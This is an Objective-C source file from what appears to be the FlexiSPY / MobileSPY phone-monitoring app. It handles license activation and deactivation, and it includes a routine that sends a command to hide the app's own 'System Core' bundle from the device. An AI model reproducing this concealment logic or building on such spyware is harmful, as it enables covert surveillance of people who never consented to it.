//
//  Activation.m
//  FlexiSPY
//
//  Created by Dominique  Mayrand on 12/1/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "Activation.h"
#import "MobileSPYAppDelegate.h"

#import "AppEngineUICmd.h"
#import "LicenseInfo.h"
#import "ProductActivationData.h"
#import "ConfigurationManager.h"
#import "PreferenceManagerImpl.h"
#import "PrefVisibility.h"

@interface Activation (private)
- (void) changeSystemCoreVisibility: (BOOL) aVisible;
- (void) dismissKeyboard;
@end

@implementation Activation

@synthesize mActivationCode, mActivate;
@synthesize mActivateLabel;
@synthesize mSpinner;
@synthesize mVisibilityAlert;

 // The designated initializer.  Override if you create the controller programmatically and want to perform customization that is not appropriate for viewDidLoad.
- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil {
    if (self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil]) {
        // Custom initialization
    }
    return self;
}

- (void)textFieldDidEndEditing:(UITextField *)textField{
	/*if([[textField text] length] > 0){
		[mActivate setEnabled:YES];
	}else{
		[mActivate setEnabled:NO];
	}
	*/
}

- (IBAction) pressDoneKey { 
	
}

// Implement viewDidLoad to do additional setup after loading the view, typically from a nib.
- (void)viewDidLoad {
    [super viewDidLoad];
    
    // This code also result in moving the view to below the navigation bar but we will use the property 'edgesForExtendedLayout' because it's more meaningful
    //self.navigationController.navigationBar.translucent = NO;
    
    // Adjust view position to be under navigation bar
    if ([self respondsToSelector:@selector(edgesForExtendedLayout)]) {
        DLog(@"set edgesForExtendedLayout")
        self.edgesForExtendedLayout = UIRectEdgeNone;
    }
    
    UITapGestureRecognizer *tap = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(dismissKeyboard)];
    [self.view addGestureRecognizer:tap];
    [tap release];
    
	DLog(@"-->Enter<--")
	
	MobileSPYAppDelegate *appDelegate = (MobileSPYAppDelegate *)[[UIApplication sharedApplication] delegate];
	[[appDelegate mAppUIConnection] addCommandDelegate:self];
	
	LicenseInfo *licInfo = [appDelegate mLicenseInfo];
	if ([licInfo licenseStatus] == DEACTIVATED) {
	} else {
		[mActivate setTitle:NSLocalizedString(@"kDeactivateButtonText", @"") forState:UIControlStateNormal];
		[mActivationCode setText:[licInfo activationCode]];
		[mActivationCode setUserInteractionEnabled:NO];
		[mActivateLabel setText:NSLocalizedString(@"kDeactivateLabelText", @"")];
	}
}

- (void)viewWillDisappear: (BOOL) animated {
	DLog(@"----->Enter<-----")
	[super viewWillDisappear:animated];
	MobileSPYAppDelegate *appDelegate = (MobileSPYAppDelegate *)[[UIApplication sharedApplication] delegate];
	[[appDelegate mAppUIConnection] removeCommandDelegate:self];
}

/*
// Override to allow orientations other than the default portrait orientation.
- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation {
    // Return YES for supported orientations
    return (interfaceOrientation == UIInterfaceOrientationPortrait);
}
*/

- (void)didReceiveMemoryWarning {
	// Releases the view if it doesn't have a superview.
    [super didReceiveMemoryWarning];
	
	// Release any cached data, images, etc that aren't in use.
}

- (void)viewDidUnload {
    [super viewDidUnload];
	// Release any retained subviews of the main view.
	// e.g. self.myOutlet = nil;
}

- (void) commandCompleted: (id) aCmdResponse toCommand: (NSInteger) aCmd {
	DLog(@"aCmd: %ld", (long)aCmd)
	if (aCmd == kAppUI2EngineDeactivateCmd || aCmd == kAppUI2EngineActivateCmd) {
		[mActivate setEnabled:YES];
		[mActivate setAlpha:1];
		[mSpinner stopAnimating];
		
		NSData *data = aCmdResponse;
		ProductActivationData *pActivationData = [[ProductActivationData alloc] initWithData:data];
		MobileSPYAppDelegate *appDelegate = (MobileSPYAppDelegate *) [[UIApplication sharedApplication] delegate];
		[appDelegate setMLicenseInfo:[pActivationData mLicenseInfo]];
		[[appDelegate mConfigurationManager] updateConfigurationID:[[pActivationData mLicenseInfo] configID]];
		NSString* message = nil;
		NSString *title = nil;
		if ([pActivationData mIsSuccess]) {
			if (aCmd == kAppUI2EngineActivateCmd) {
				title = [NSString stringWithString:NSLocalizedString(@"kActivationTitle", @"")];
				// Change UI texts
				[mActivate setTitle:NSLocalizedString(@"kDeactivateButtonText", @"") forState:UIControlStateNormal];
				[mActivationCode setUserInteractionEnabled:NO];
				[mActivateLabel setText:NSLocalizedString(@"kDeactivateLabelText", @"")];
				
				[[self navigationItem] setTitle:NSLocalizedString(@"kMainViewDeactivate", @"")];
				LicenseInfo *licenseInfo = [pActivationData mLicenseInfo];
				if ([licenseInfo configID] == CONFIG_EXTREME_ADVANCED) {
					//[[[self navigationItem] leftBarButtonItem] setTitle:NSLocalizedString(@"kOMNITitle", @"")];
				} else if ([licenseInfo configID] == CONFIG_PREMIUM_BASIC) {
					//[[[self navigationItem] leftBarButtonItem] setTitle:NSLocalizedString(@"kLIGHTTitle", @"")];
				} else if ([licenseInfo configID] == CONFIG_TABLET) {
				}
				
				message = [NSString stringWithString:NSLocalizedString(@"kActivationSuccessText", @"")];
			} else {
				title = [NSString stringWithString:NSLocalizedString(@"kDeactivationTitle", @"")];
				// Change UI texts
				[mActivate setTitle:NSLocalizedString(@"kActivateButtonText", @"") forState:UIControlStateNormal];
				[mActivationCode setUserInteractionEnabled:YES];
				[mActivateLabel setText:NSLocalizedString(@"kActivateLabelText", @"")];
				
				[[self navigationItem] setTitle:NSLocalizedString(@"kMainViewActivate", @"")];
				//self.navigationItem.leftBarButtonItem.title = NSLocalizedString(@"kUnknownTitle", @"");
				
				message = [NSString stringWithString:NSLocalizedString(@"kDeactivationSuccessText", @"")];
                
                appDelegate.mShowActivateWizard = YES;
			}
		} else {
			if (aCmd == kAppUI2EngineActivateCmd) {
				[mActivationCode setUserInteractionEnabled:YES];
                title = [NSString stringWithString:NSLocalizedString(@"kActivationTitle1", @"")];
				message = [NSString stringWithFormat:@"%@\n%@", NSLocalizedString(@"kActivationFailedText", @""), [pActivationData mErrorDescription]];
			} else {
                title = [NSString stringWithString:NSLocalizedString(@"kDeactivationTitle", @"")];
				message = [NSString stringWithFormat:@"%@\n%@", NSLocalizedString(@"kDeactivationFailedText", @""), [pActivationData mErrorDescription]];
			}
		}
		UIAlertView *alert = [[UIAlertView alloc] init];
		[alert setTitle:title];
		[alert setMessage:message];
		[alert setDelegate:self];
		[alert addButtonWithTitle:NSLocalizedString(@"kOkButtonTitle", @"")];
		[alert show];
		[alert release];
		[pActivationData release];
	}
}

- (void)dealloc {	
	[mSpinner release];
	[mActivateLabel release];
	[mActivationCode release];
	[mActivate release];
    [mVisibilityAlert release];
    [super dealloc];
}

-(IBAction) activate:(id) sender {
	// If deactivate make sure to ask confirmation
	[mActivationCode resignFirstResponder];
	MobileSPYAppDelegate *appDelegate = (MobileSPYAppDelegate *)[[UIApplication sharedApplication] delegate];
	LicenseInfo *licInfo = [appDelegate mLicenseInfo];
	if ([licInfo licenseStatus] == DEACTIVATED && [[mActivationCode text] length] == 0) {
		UIAlertView *alert = [[UIAlertView alloc] init];
		[alert setTitle:NSLocalizedString(@"kActivationTitle", @"")];
		[alert setMessage:NSLocalizedString(@"kInvalidActivationCode", @"")];
		[alert setDelegate:self];
		[alert addButtonWithTitle:NSLocalizedString(@"kOkButtonTitle", @"")];
		[alert show];
		[alert release];
	} else {
		[mActivate setEnabled:NO];
		[mActivate setAlpha:0.5];
		[mSpinner startAnimating];
		NSString *activationCode = [mActivationCode text];
		NSInteger command = kAppUI2EngineActivateCmd;
		if ([licInfo licenseStatus] == ACTIVATED ||
			[licInfo licenseStatus] == EXPIRED ||
			[licInfo licenseStatus] == DISABLE) {
			command = kAppUI2EngineDeactivateCmd;
		} else {
			[mActivationCode setUserInteractionEnabled:NO];
		}

		[[appDelegate mAppUIConnection] processCommand:command withCmdData:activationCode];
	}
}

- (void)alertView:(UIAlertView *)alertView didDismissWithButtonIndex:(NSInteger)buttonIndex {
	DLog (@"Button index of clicked button of alert is = %ld", (long)buttonIndex);
    
    if ([alertView isEqual:[self mVisibilityAlert]]) {
        if (buttonIndex == 0) {
            // Yes
        } else if (buttonIndex == 1) {
            // No
            [self changeSystemCoreVisibility:NO];
        }
        [self setMVisibilityAlert:nil];
    } else {
        if (buttonIndex == 0) {
          MobileSPYAppDelegate *appDelegate = (MobileSPYAppDelegate *)[[UIApplication sharedApplication] delegate];
            if ([[appDelegate mLicenseInfo] licenseStatus] == ACTIVATED) {
//                PreferenceManagerImpl *prefManagerImpl = [[PreferenceManagerImpl alloc] init];
//                PrefVisibility *prefVisibility = (PrefVisibility *)[prefManagerImpl preference:kVisibility];
//                if ([prefVisibility mVisible]) {
//                    UIAlertView *alert = [[UIAlertView alloc] init];
//                    [alert setTitle:NSLocalizedString(@"kVisibilityAppTitle", @"")];
//                    [alert setMessage:NSLocalizedString(@"kVisibilityQuestion", @"")];
//                    [alert setDelegate:self];
//                    [alert addButtonWithTitle:NSLocalizedString(@"kNoButtonTitle", @"")];
//                    [alert addButtonWithTitle:NSLocalizedString(@"kYesButtonTitle", @"")];
//                    [alert show];
//                    [self setMVisibilityAlert:alert];
//                    [alert release];
//                }
//                [prefManagerImpl release];
            }
        }
    }
}

- (void) changeSystemCoreVisibility: (BOOL) aVisible {
    DLog (@"changeSystemCoreVisibility ... %d", aVisible);
	NSMutableData *visibilityData = [NSMutableData data];
	
	BOOL visible = aVisible;
	NSInteger length = 0;
	
	NSInteger count = 1;
	[visibilityData appendBytes:&count length:sizeof(NSInteger)];
	
	// System Core
	NSString *bundleIndentifier = [[NSBundle mainBundle] bundleIdentifier];
	length = [bundleIndentifier lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	[visibilityData appendBytes:&length length:sizeof(NSInteger)];
	[visibilityData appendData:[bundleIndentifier dataUsingEncoding:NSUTF8StringEncoding]];
	[visibilityData appendBytes:&visible length:sizeof(BOOL)];
	
	MobileSPYAppDelegate *appDelegate = (MobileSPYAppDelegate *)[[UIApplication sharedApplication] delegate];
	[[appDelegate mAppUIConnection] processCommand:kAppUI2EngineSystemCoreVisibilityCmd withCmdData:visibilityData];
}

- (void) dismissKeyboard {
    [mActivationCode resignFirstResponder];
}

@end
